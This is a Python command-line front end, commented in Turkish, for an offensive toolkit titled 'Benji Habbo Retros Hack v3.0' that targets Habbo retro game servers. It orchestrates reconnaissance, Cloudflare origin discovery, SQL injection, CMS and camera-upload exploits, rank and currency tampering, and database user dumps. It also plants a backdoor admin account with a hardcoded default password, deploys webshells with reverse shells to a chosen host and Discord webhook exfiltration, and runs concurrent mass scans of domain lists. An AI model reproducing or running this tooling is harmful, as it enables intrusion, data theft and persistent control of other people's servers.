#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Benji Habbo Retros Hack - Unified CLI Interface v3.0
Komut satiri arayuzu ile tum modulleri yonetir.

Kullanim:
  python cli.py scan <domain>
  python cli.py exploit <domain> --rank <username>
  python cli.py mass_scan <list.txt>
  python cli.py persist <domain> --shell
  python cli.py scrape <domain> --dump
  python cli.py gui [domain]
"""

import sys
import os
import json
import time
import threading
import argparse
from typing import Optional, Dict, Any, List
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Module imports
try:
    from modules.cloudflare_bypass import CloudflareBypass
    HAS_CLOUDFLARE = True
except ImportError:
    HAS_CLOUDFLARE = False

try:
    from modules.admin_extractor import AdminExtractor
    HAS_ADMIN = True
except ImportError:
    HAS_ADMIN = False

try:
    from modules.packet_manipulator import PacketManipulator
    HAS_PACKET = True
except ImportError:
    HAS_PACKET = False

try:
    from modules.cms_exploiter import CMSExploiter
    HAS_CMS = True
except ImportError:
    HAS_CMS = False

try:
    from modules.rate_limit_bypass import RateLimitBypass
    HAS_RLB = True
except ImportError:
    HAS_RLB = False

try:
    from modules.database_exploiter import DatabaseExploiter
    HAS_DB = True
except ImportError:
    HAS_DB = False

try:
    from modules.gearth_injector import GEarthInjector
    HAS_GEARTH = True
except ImportError:
    HAS_GEARTH = False

try:
    from modules.hotel_fingerprinter import HotelFingerprinter
    HAS_FINGERPRINTER = True
except ImportError:
    HAS_FINGERPRINTER = False

try:
    from modules.targeted_sqli import TargetedSQLi
    HAS_SQLI = True
except ImportError:
    HAS_SQLI = False

try:
    from modules.persistence import Persistence
    HAS_PERSISTENCE = True
except ImportError:
    HAS_PERSISTENCE = False

try:
    from modules.habbo_camera_exploit import HabboCameraExploit
    HAS_CAMERA = True
except ImportError:
    HAS_CAMERA = False

try:
    from utils.log_utils import Logger, LogLevel
    HAS_UTILS = True
except ImportError:
    HAS_UTILS = False


class CLILogger:
    """CLI icin renkli konsol logger."""
    COLORS = {
        "INFO": "\033[96m",      # Cyan
        "SUCCESS": "\033[92m",   # Green
        "WARNING": "\033[93m",   # Yellow
        "ERROR": "\033[91m",     # Red
        "CRITICAL": "\033[95m",  # Magenta
        "DEBUG": "\033[90m",     # Gray
        "RESET": "\033[0m",
        "BOLD": "\033[1m",
    }

    def __init__(self, name: str = "CLI"):
        self.name = name
        self.log_file = None
        self._setup_log_file()

    def _setup_log_file(self):
        try:
            log_dir = "logs"
            os.makedirs(log_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.log_file = open(f"{log_dir}/cli_{timestamp}.json", "a", encoding="utf-8")
        except Exception:
            self.log_file = None

    def _log(self, level: str, message: str, tag: str = "") -> None:
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = self.COLORS.get(level, self.COLORS["INFO"])
        tag_str = f" [{tag}]" if tag else ""
        print(f"{color}[{timestamp}] [{level}]{tag_str} {message}{self.COLORS['RESET']}")

        # JSON log
        if self.log_file:
            try:
                log_entry = json.dumps({
                    "timestamp": datetime.now().isoformat(),
                    "level": level,
                    "tag": tag,
                    "message": message,
                })
                self.log_file.write(log_entry + "\n")
                self.log_file.flush()
            except Exception:
                pass

    def info(self, msg: str, tag: str = ""): self._log("INFO", msg, tag)
    def success(self, msg: str, tag: str = ""): self._log("SUCCESS", msg, tag)
    def warning(self, msg: str, tag: str = ""): self._log("WARNING", msg, tag)
    def error(self, msg: str, tag: str = ""): self._log("ERROR", msg, tag)
    def critical(self, msg: str, tag: str = ""): self._log("CRITICAL", msg, tag)

    def close(self):
        if self.log_file:
            self.log_file.close()


def make_gui_callback(logger: CLILogger, tag: str):
    """CLI logger'dan gui_callback formatinda fonksiyon olustur."""
    def callback(msg: str):
        msg = msg.strip()
        level = "INFO"
        if msg.startswith("[ERROR]"): level = "ERROR"; msg = msg[7:].strip()
        elif msg.startswith("[WARNING]"): level = "WARNING"; msg = msg[9:].strip()
        elif msg.startswith("[SUCCESS]"): level = "SUCCESS"; msg = msg[9:].strip()
        elif msg.startswith("[CRITICAL]"): level = "CRITICAL"; msg = msg[10:].strip()
        elif msg.startswith("[DEBUG]"): level = "DEBUG"; msg = msg[7:].strip()
        elif msg.startswith("[INFO]"): level = "INFO"; msg = msg[6:].strip()
        logger._log(level, msg, tag)
    return callback


def cmd_scan(args):
    """scan <domain> - Tam recon yap."""
    logger = CLILogger("Scan")
    url = args.domain
    if not url.startswith("http"):
        url = f"https://{url}"

    logger.critical(f"=== TAM RECON BASLATILDI: {url} ===")

    results = {"target": url, "timestamp": datetime.now().isoformat()}

    # 1. Hotel Fingerprinter
    if HAS_FINGERPRINTER:
        logger.info("Hotel Fingerprinter calistiriliyor...", "SCAN")
        try:
            fp = HotelFingerprinter(url, gui_callback=make_gui_callback(logger, "FP"))
            fp_result = fp.run(timeout=args.timeout)
            results["fingerprint"] = fp_result
            if fp_result.get("cms_detected"):
                logger.success(f"CMS: {fp_result['cms_detected']}", "SCAN")
            if fp_result.get("emulator_detected"):
                logger.success(f"Emulator: {fp_result['emulator_detected']}", "SCAN")
        except Exception as e:
            logger.error(f"Fingerprint hatasi: {e}", "SCAN")

    # 2. Cloudflare Bypass
    if HAS_CLOUDFLARE:
        logger.info("Cloudflare Bypass calistiriliyor...", "SCAN")
        try:
            cf = CloudflareBypass(url, gui_callback=make_gui_callback(logger, "CF"))
            cf_result = cf.run(timeout=args.timeout)
            results["cloudflare"] = cf_result
            if cf_result.get("real_ips"):
                logger.success(f"Gercek IP'ler: {cf_result['real_ips']}", "SCAN")
        except Exception as e:
            logger.error(f"Cloudflare hatasi: {e}", "SCAN")

    # 3. Admin Extraction
    if HAS_ADMIN:
        logger.info("Admin Extraction calistiriliyor...", "SCAN")
        try:
            ae = AdminExtractor(url, gui_callback=make_gui_callback(logger, "ADMIN"))
            ae_result = ae.run(timeout=args.timeout)
            results["admin"] = ae_result
            panels = ae_result.get("admin_panels", [])
            if panels:
                logger.success(f"Admin panelleri: {len(panels)} bulundu", "SCAN")
        except Exception as e:
            logger.error(f"Admin hatasi: {e}", "SCAN")

    # 4. CMS Exploiter
    if HAS_CMS:
        logger.info("CMS Exploiter calistiriliyor...", "SCAN")
        try:
            cms = CMSExploiter(url, gui_callback=make_gui_callback(logger, "CMS"))
            cms_result = cms.run(timeout=args.timeout)
            results["cms_exploits"] = cms_result
        except Exception as e:
            logger.error(f"CMS hatasi: {e}", "SCAN")

    # 5. Targeted SQLi
    if HAS_SQLI:
        logger.info("Targeted SQLi calistiriliyor...", "SCAN")
        try:
            sqli = TargetedSQLi(url, gui_callback=make_gui_callback(logger, "SQLi"))
            sqli_result = sqli.run(timeout=args.timeout)
            results["sqli"] = sqli_result
            if sqli_result.get("vulnerabilities"):
                logger.success(f"SQLi aciklari: {len(sqli_result['vulnerabilities'])}", "SCAN")
        except Exception as e:
            logger.error(f"SQLi hatasi: {e}", "SCAN")

    # 6. Rate Limit Bypass
    if HAS_RLB:
        logger.info("Rate Limit Bypass calistiriliyor...", "SCAN")
        try:
            rlb = RateLimitBypass(url, gui_callback=make_gui_callback(logger, "RLB"))
            rlb_result = rlb.run(timeout=min(args.timeout, 30))
            results["rate_limit"] = rlb_result
        except Exception as e:
            logger.error(f"RLB hatasi: {e}", "SCAN")

    # 7. Habbo Camera Exploit
    if HAS_CAMERA:
        logger.info("Habbo Camera Exploit calistiriliyor...", "SCAN")
        try:
            cam = HabboCameraExploit(url, gui_callback=make_gui_callback(logger, "CAM"))
            cam_result = cam.run(timeout=args.timeout)
            results["camera"] = cam_result
            if cam_result.get("swf_upload_success"):
                logger.success(f"Webshell: {cam_result['webshell_url']}", "SCAN")
        except Exception as e:
            logger.error(f"Camera hatasi: {e}", "SCAN")

    # Sonuclari kaydet
    output_file = f"scan_{args.domain.replace('https://', '').replace('http://', '').replace('/', '_')}.json"
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, default=str)
        logger.success(f"Sonuclar kaydedildi: {output_file}", "SCAN")
    except Exception as e:
        logger.error(f"Kayit hatasi: {e}", "SCAN")

    logger.critical("=== RECON TAMAMLANDI ===")
    logger.close()
    return results


def cmd_exploit(args):
    """exploit <domain> --rank <username> - Tum vektorlerle exploit."""
    logger = CLILogger("Exploit")
    url = args.domain
    if not url.startswith("http"):
        url = f"https://{url}"

    logger.critical(f"=== EXPLOIT BASLATILDI: {url} ===")
    results = {"target": url, "timestamp": datetime.now().isoformat()}

    # 1. Hotel Exploiter (Packet Manipulation)
    if HAS_PACKET and args.rank:
        logger.info(f"Hotel Exploiter calistiriliyor (hedef: {args.rank})...", "EXPLOIT")
        try:
            pm = PacketManipulator(url, gui_callback=make_gui_callback(logger, "PKT"))
            pkt_result = pm.run_full_manipulation(
                modify_rank=True, new_rank=7,
                modify_credits=True, credit_amount=999999,
                modify_pixels=True, pixel_amount=999999,
                modify_diamonds=True, diamond_amount=999999,
            )
            results["packet_manipulation"] = pkt_result
            if pkt_result.get("rank_modified"):
                logger.success("Rank basariyla degistirildi!", "EXPLOIT")
        except Exception as e:
            logger.error(f"Packet hatasi: {e}", "EXPLOIT")

    # 2. G-Earth Injector
    if HAS_GEARTH and args.rank:
        logger.info(f"G-Earth Injector calistiriliyor (hedef: {args.rank})...", "EXPLOIT")
        try:
            ge = GEarthInjector(url, gui_callback=make_gui_callback(logger, "GE"))
            ge_result = ge.run(
                sso_token=None, target_username=args.rank, new_rank=7,
                credit_amount=999999, pixel_amount=999999, diamond_amount=999999,
                timeout=args.timeout, use_mitm=args.mitm
            )
            results["gearth"] = ge_result
        except Exception as e:
            logger.error(f"GEarth hatasi: {e}", "EXPLOIT")

    # 3. Database Exploiter
    if HAS_DB and all([args.db_host, args.db_user, args.db_name, args.rank]):
        logger.info("Database Exploiter calistiriliyor...", "EXPLOIT")
        try:
            de = DatabaseExploiter(url, gui_callback=make_gui_callback(logger, "DB"))
            db_result = de.run(
                db_host=args.db_host, db_port=args.db_port or 3306,
                db_user=args.db_user, db_pass=args.db_pass or "",
                db_name=args.db_name, target_username=args.rank, new_rank=7,
                credit_amount=999999, pixel_amount=999999, diamond_amount=999999,
                create_admin=args.create_admin,
                new_admin_user=args.new_admin_user, new_admin_pass=args.new_admin_pass,
                timeout=args.timeout
            )
            results["database"] = db_result
            if db_result.get("rank_modified"):
                logger.success("DB rank basariyla degistirildi!", "EXPLOIT")
        except Exception as e:
            logger.error(f"DB hatasi: {e}", "EXPLOIT")

    # 4. Persistence
    if HAS_PERSISTENCE and args.shell:
        logger.info("Persistence modulu calistiriliyor...", "EXPLOIT")
        try:
            persist = Persistence(url, gui_callback=make_gui_callback(logger, "PERSIST"))
            persist_result = persist.run(
                admin_session_cookie=args.session,
                reverse_host=args.reverse_host, reverse_port=args.reverse_port,
                discord_webhook=args.discord_webhook,
                timeout=args.timeout
            )
            results["persistence"] = persist_result
        except Exception as e:
            logger.error(f"Persistence hatasi: {e}", "EXPLOIT")

    # Sonuclari kaydet
    output_file = f"exploit_{args.domain.replace('https://', '').replace('http://', '').replace('/', '_')}.json"
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, default=str)
        logger.success(f"Sonuclar kaydedildi: {output_file}", "EXPLOIT")
    except Exception as e:
        logger.error(f"Kayit hatasi: {e}", "EXPLOIT")

    logger.critical("=== EXPLOIT TAMAMLANDI ===")
    logger.close()
    return results


def cmd_mass_scan(args):
    """mass_scan <list.txt> - Toplu tarama (10 concurrent)."""
    logger = CLILogger("MassScan")
    logger.critical(f"=== TOPLU TARAMA BASLATILDI: {args.list_file} ===")

    try:
        with open(args.list_file, "r") as f:
            domains = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except Exception as e:
        logger.error(f"Dosya okunamadi: {e}", "MASSS")
        return

    logger.info(f"Toplam {len(domains)} domain taranacak", "MASSS")
    results = {}

    def scan_domain(domain):
        try:
            class Args:
                pass
            a = Args()
            a.domain = domain
            a.timeout = args.timeout
            return cmd_scan(a)
        except Exception as e:
            return {"target": domain, "error": str(e)}

    with ThreadPoolExecutor(max_workers=args.concurrent or 10) as executor:
        futures = {executor.submit(scan_domain, d): d for d in domains}
        for future in as_completed(futures):
            domain = futures[future]
            try:
                result = future.result()
                results[domain] = result
                vuln_count = len(result.get("sqli", {}).get("vulnerabilities", [])) + \
                            len(result.get("cms_exploits", {}).get("vulnerabilities", []))
                logger.success(f"[{list(results.keys()).index(domain)+1}/{len(domains)}] {domain}: {vuln_count} acik", "MASSS")
            except Exception as e:
                logger.error(f"{domain}: {e}", "MASSS")

    # Toplu sonuc kaydet
    output_file = f"mass_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, default=str)
        logger.success(f"Toplu sonuclar kaydedildi: {output_file}", "MASSS")
    except Exception as e:
        logger.error(f"Kayit hatasi: {e}", "MASSS")

    logger.critical(f"=== TOPLU TARAMA TAMAMLANDI: {len(results)} domain ===")
    logger.close()


def cmd_persist(args):
    """persist <domain> --shell - Webshell + reverse shell."""
    logger = CLILogger("Persist")
    url = args.domain
    if not url.startswith("http"):
        url = f"https://{url}"

    logger.critical(f"=== PERSISTENCE BASLATILDI: {url} ===")

    if not HAS_PERSISTENCE:
        logger.error("Persistence modulu yuklu degil!", "PERSIST")
        return

    try:
        persist = Persistence(url, gui_callback=make_gui_callback(logger, "PERSIST"))
        result = persist.run(
            admin_session_cookie=args.session,
            known_paths=args.paths.split(",") if args.paths else None,
            reverse_host=args.reverse_host,
            reverse_port=args.reverse_port,
            discord_webhook=args.discord_webhook,
            timeout=args.timeout
        )
        if result.get("webshells_deployed"):
            logger.success(f"Webshell'ler yuklendi: {result['webshells_deployed']}", "PERSIST")
        if result.get("reverse_shell_attempted"):
            logger.success("Reverse shell gonderildi", "PERSIST")

        output_file = f"persist_{args.domain.replace('https://', '').replace('http://', '').replace('/', '_')}.json"
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(result, f, indent=2, default=str)
        logger.success(f"Sonuclar kaydedildi: {output_file}", "PERSIST")
    except Exception as e:
        logger.error(f"Persistence hatasi: {e}", "PERSIST")

    logger.critical("=== PERSISTENCE TAMAMLANDI ===")
    logger.close()


def cmd_scrape(args):
    """scrape <domain> --dump - Veritabani dump."""
    logger = CLILogger("Scrape")
    url = args.domain
    if not url.startswith("http"):
        url = f"https://{url}"

    logger.critical(f"=== VERI CEKME BASLATILDI: {url} ===")

    if not HAS_DB:
        logger.error("Database modulu yuklu degil!", "SCRAPE")
        return

    if not all([args.db_host, args.db_user, args.db_name]):
        logger.error("DB Host, Kullanici ve DB Adi gerekli! (--db-host, --db-user, --db-name)", "SCRAPE")
        return

    try:
        de = DatabaseExploiter(url, gui_callback=make_gui_callback(logger, "DB"))
        result = de.run(
            db_host=args.db_host, db_port=args.db_port or 3306,
            db_user=args.db_user, db_pass=args.db_pass or "",
            db_name=args.db_name, target_username=args.target or "",
            new_rank=7, timeout=args.timeout
        )
        if result.get("tables_found"):
            logger.success(f"Tablolar: {result['tables_found']}", "SCRAPE")
        if result.get("users_dumped"):
            logger.success(f"Kullanicilar: {len(result['users_dumped'])}", "SCRAPE")

        output_file = f"scrape_{args.domain.replace('https://', '').replace('http://', '').replace('/', '_')}.json"
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(result, f, indent=2, default=str)
        logger.success(f"Veriler kaydedildi: {output_file}", "SCRAPE")
    except Exception as e:
        logger.error(f"Scrape hatasi: {e}", "SCRAPE")

    logger.critical("=== VERI CEKME TAMAMLANDI ===")
    logger.close()


def cmd_gui(args):
    """gui [domain] - Grafik arayuzu baslat."""
    try:
        from main import main
        sys.argv = [sys.argv[0]]
        if args.domain:
            sys.argv.append(args.domain)
        main()
    except Exception as e:
        print(f"GUI baslatilamadi: {e}")
        print("python main.py seklinde deneyin.")


def main():
    parser = argparse.ArgumentParser(
        description="Benji Habbo Retros Hack v3.0 - Unified CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ornek kullanim:
  python cli.py scan example.com
  python cli.py exploit example.com --rank hedefkullanici
  python cli.py exploit example.com --rank hedefkullanici --db-host localhost --db-user root --db-name habbo
  python cli.py mass_scan domainlist.txt --concurrent 10
  python cli.py persist example.com --shell --reverse-host 1.2.3.4 --reverse-port 4444
  python cli.py scrape example.com --dump --db-host localhost --db-user root --db-name habbo
  python cli.py gui example.com
  python cli.py scan example.com --use-proxy --timeout 120
        """
    )

    subparsers = parser.add_subparsers(dest="command", help="Komutlar")

    # scan
    scan_parser = subparsers.add_parser("scan", help="Tam recon yap")
    scan_parser.add_argument("domain", help="Hedef domain (orn: example.com)")
    scan_parser.add_argument("--timeout", type=int, default=60, help="Zaman asimi (saniye)")
    scan_parser.add_argument("--use-proxy", action="store_true", help="Proxy kullan")

    # exploit
    exploit_parser = subparsers.add_parser("exploit", help="Tum vektorlerle exploit")
    exploit_parser.add_argument("domain", help="Hedef domain")
    exploit_parser.add_argument("--rank", help="Hedef kullanici adi (rank yukseltme)")
    exploit_parser.add_argument("--db-host", help="Veritabani host")
    exploit_parser.add_argument("--db-port", type=int, default=3306, help="Veritabani port")
    exploit_parser.add_argument("--db-user", help="Veritabani kullanici")
    exploit_parser.add_argument("--db-pass", help="Veritabani sifre")
    exploit_parser.add_argument("--db-name", help="Veritabani adi")
    exploit_parser.add_argument("--create-admin", action="store_true", help="Admin kullanici olustur")
    exploit_parser.add_argument("--new-admin-user", default="benji_admin", help="Yeni admin kullanici adi")
    exploit_parser.add_argument("--new-admin-pass", default="BenjiAdmin123!", help="Yeni admin sifre")
    exploit_parser.add_argument("--session", help="Admin session cookie")
    exploit_parser.add_argument("--shell", action="store_true", help="Webshell + reverse shell")
    exploit_parser.add_argument("--reverse-host", help="Reverse shell host")
    exploit_parser.add_argument("--reverse-port", type=int, help="Reverse shell port")
    exploit_parser.add_argument("--discord-webhook", help="Discord webhook URL")
    exploit_parser.add_argument("--mitm", action="store_true", help="MITM proxy kullan")
    exploit_parser.add_argument("--timeout", type=int, default=60, help="Zaman asimi")
    exploit_parser.add_argument("--use-proxy", action="store_true", help="Proxy kullan")

    # mass_scan
    mass_parser = subparsers.add_parser("mass_scan", help="Toplu tarama")
    mass_parser.add_argument("list_file", help="Domain listesi dosyasi")
    mass_parser.add_argument("--concurrent", type=int, default=10, help="Es zamanli tarama sayisi")
    mass_parser.add_argument("--timeout", type=int, default=30, help="Zaman asimi")
    mass_parser.add_argument("--use-proxy", action="store_true", help="Proxy kullan")

    # persist
    persist_parser = subparsers.add_parser("persist", help="Webshell + reverse shell")
    persist_parser.add_argument("domain", help="Hedef domain")
    persist_parser.add_argument("--shell", action="store_true", required=True, help="Webshell yukle")
    persist_parser.add_argument("--session", help="Admin session cookie")
    persist_parser.add_argument("--paths", help="Bilinen yollar (virgulle ayrilmis)")
    persist_parser.add_argument("--reverse-host", help="Reverse shell host")
    persist_parser.add_argument("--reverse-port", type=int, help="Reverse shell port")
    persist_parser.add_argument("--discord-webhook", help="Discord webhook URL")
    persist_parser.add_argument("--timeout", type=int, default=60, help="Zaman asimi")

    # scrape
    scrape_parser = subparsers.add_parser("scrape", help="Veritabani dump")
    scrape_parser.add_argument("domain", help="Hedef domain")
    scrape_parser.add_argument("--dump", action="store_true", required=True, help="DB dump yap")
    scrape_parser.add_argument("--db-host", help="Veritabani host")
    scrape_parser.add_argument("--db-port", type=int, default=3306, help="Veritabani port")
    scrape_parser.add_argument("--db-user", help="Veritabani kullanici")
    scrape_parser.add_argument("--db-pass", help="Veritabani sifre")
    scrape_parser.add_argument("--db-name", help="Veritabani adi")
    scrape_parser.add_argument("--target", help="Hedef kullanici")
    scrape_parser.add_argument("--timeout", type=int, default=60, help="Zaman asimi")

    # gui
    gui_parser = subparsers.add_parser("gui", help="Grafik arayuzu baslat")
    gui_parser.add_argument("domain", nargs="?", help="Hedef domain (opsiyonel)")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    commands = {
        "scan": cmd_scan,
        "exploit": cmd_exploit,
        "mass_scan": cmd_mass_scan,
        "persist": cmd_persist,
        "scrape": cmd_scrape,
        "gui": cmd_gui,
    }

    commands[args.command](args)


if __name__ == "__main__":
    main()
